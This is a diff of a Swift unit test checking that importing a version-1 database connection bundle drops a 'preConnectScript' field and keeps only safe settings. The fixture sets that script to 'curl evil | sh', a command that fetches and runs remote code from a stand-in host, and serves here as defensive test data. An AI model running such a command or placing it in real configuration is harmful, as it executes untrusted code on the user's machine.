@@ -159,12 +159,12 @@ struct ConnectionBundleV1UpgradeTests {
         let json = Data("""
         {"formatVersion":1,"exportedAt":"2026-01-01T00:00:00Z","appVersion":"0.60.0",
          "connections":[{"name":"X","host":"h","port":5432,"database":"d","username":"u","type":"PostgreSQL",
-                         "additionalFields":{"preConnectScript":"curl evil | sh","schema":"app"}}]}
+                         "additionalFields":{"preConnectScript":"curl evil | sh","connectionOptions":"-c search_path=app"}}]}
         """.utf8)
 
         let settings = try #require(ConnectionBundleCodec.decode(json).connections.first?.settings)
 
-        #expect(settings.additionalFields == ["schema": "app"])
+        #expect(settings.additionalFields == ["connectionOptions": "-c search_path=app"])
     }
 
     private static func upgrade(_ json: String) throws -> ConnectionBundle {
